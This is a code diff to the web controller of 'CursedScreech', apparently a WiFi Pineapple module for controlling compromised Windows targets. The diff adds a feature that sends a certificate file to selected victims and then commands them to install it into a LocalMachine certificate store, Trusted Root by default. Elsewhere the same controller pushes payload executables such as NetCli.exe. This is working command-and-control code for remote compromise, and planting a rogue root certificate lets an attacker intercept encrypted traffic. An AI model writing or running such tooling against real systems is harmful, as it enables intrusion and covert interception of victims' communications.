@@ -51,6 +51,22 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 	$scope.newCmdName			= "";
 	$scope.newCmdCommand		= "";
 	$scope.checkAllTargets		= false;
+	$scope.target_installKey	= "";
+	$scope.certStores			= [
+									{"ID":"Root", "Name":"Trusted Root Certification Authorities"},
+									{"ID":"My", "Name":"Personal"},
+									{"ID":"Remote Desktop", "Name":"Remote Desktop"},
+									{"ID":"Trust", "Name":"Enterprise Trust"},
+									{"ID":"CA", "Name":"Intermediate Certification Authorities"},
+									{"ID":"SmartCardRoot", "Name":"Smart Card Trusted Roots"},
+									{"ID":"TrustedPublisher", "Name":"Trusted Publishers"},
+									{"ID":"TrustedPeople", "Name":"Trusted People"},
+									{"ID":"ClientAuthIssuer", "Name":"Client Authentication Issuers"},
+									{"ID":"eSIM Certification Authorities", "Name":"eSIM Certification Authorities"},
+									{"ID":"Windows Live ID Token Issuer", "Name":"Windows Live ID Token Issuer"},
+									{"ID":"Homegroup Machine Certificates", "Name":"Homegroup Machine Certificates"}
+								];
+	$scope.selectedCertStore	= $scope.certStores[0];
 	
 	// Panes
 	$scope.showTargetPane		= true;
@@ -62,6 +78,7 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 	$scope.uploading			= false;
 	$scope.selectedPayload		= "";
 	$scope.showPayloadSelect	= false;
+	$scope.showCertSelect		= false;
 	
 	// Interval vars
 	$scope.stop;
@@ -313,6 +330,8 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 		if ($scope.showPayloadSelect) {
 			// ex: "sendfile;/pineapple/modules/CursedScreech/includes/payloads/NetCli.exe;C:\Temp\"
 			cmd = "sendfile;" + $scope.payloadDir + $scope.selectedPayload.fileName + ";" + $scope.targetCommand;
+		} else if ($scope.showCertSelect) {
+			cmd = "sendfile;" + $scope.target_installKey + ";" + getEZCmd("Send File");
 		} else {
 			cmd = $scope.targetCommand;
 		}
@@ -321,7 +340,23 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 			action: 'sendCommand',
 			command: cmd,
 			targets: checkedTargets
-		},function(response){});
+		},function(response){
+			
+			// Make a second API call to install the certificate
+			if ($scope.showCertSelect) {
+
+				cmd = $scope.targetCommand.replace("$cert", getEZCmd("Send File") + $scope.target_installKey.split("/").slice(-1)[0]).replace("$store", "'Cert:\\LocalMachine\\" + $scope.selectedCertStore.ID + "'")
+				
+				$api.request({
+					module: 'CursedScreech',
+					action: 'sendCommand',
+					command: cmd,
+					targets: checkedTargets
+				},function(response){});
+				
+			}
+			
+		});
 	});
 	
 	function getTargetIndex(sock){
@@ -458,23 +493,27 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 	});
 	
 	$scope.ezCommandChange = (function(){
+		$scope.showPayloadSelect = false;
+		$scope.showCertSelect = false;
 		if ($scope.selectedCmd === null) {
 			$scope.targetCommand = "";
-			$scope.showPayloadSelect = false;
 			return;
 		}
 		for (key in $scope.ezcmds) {
 			if ($scope.ezcmds[key] == $scope.selectedCmd) {
 				if (key == "Send File") {
 					$scope.showPayloadSelect = true;
-				} else {
-					$scope.showPayloadSelect = false;
+				} else if (key == "Install Cert") {
+					$scope.showCertSelect = true;
 				}
 			}
 		}
 		$scope.targetCommand = $scope.selectedCmd;
 	});
 	
+	function getEZCmd(key) {
+		return $scope.ezcmds[key];
+	}
 	
 	/* ============================================= */
 	/*              BEGIN KEY FUNCTIONS              */
@@ -484,9 +523,15 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 		if (type == "kuro") {
 			$scope.selectKuroKey = true;
 			$scope.selectTargetKey = false;
+			$scope.selectInstallKey = false;
 		} else if (type == "target") {
 			$scope.selectTargetKey = true;
 			$scope.selectKuroKey = false;
+			$scope.selectInstallKey = false;
+		} else if (type == "install") {
+			$scope.selectInstallKey = true;
+			$scope.selectKuroKey = false;
+			$scope.selectTargetKey = false;
 		}
 		$api.request({
 			module: 'CursedScreech',
@@ -509,6 +554,8 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 			$scope.settings_kuroKey = keyPath;
 		} else if ($scope.selectTargetKey == true) {
 			$scope.settings_targetKey = keyPath;
+		} else if ($scope.selectInstallKey == true) {
+			$scope.target_installKey = keyPath + ".cer";
 		}
 	});
 	
@@ -636,7 +683,7 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 		$http.post("/modules/CursedScreech/api/module.php", fd, {
 			transformRequest: angular.identity,
 			headers: {'Content-Type': undefined}
-		}).success(function(response) {
+		}).then(function(response) {
 			for (var key in response) {
 				if (response.hasOwnProperty(key)) {
 					if (response.key == "Failed") {
@@ -711,6 +758,22 @@ registerController('CursedScreechController', ['$api', '$scope', '$sce', '$inter
 		$scope.stop = undefined;
 	});
 	
+	$scope.init = (function(){
+		$api.request({
+			module: 'CursedScreech',
+			action: 'init'
+		},function(response){
+			if (response.success == false) {
+				if (response.message != '') {
+					$scope.getLogs();
+				} else {
+					alert(response.message);
+				}
+			}
+		});
+	});
+	
+	$scope.init();
 	$scope.loadAvailableInterfaces();
 	$scope.loadSettings();
 	$scope.loadEZCmds();
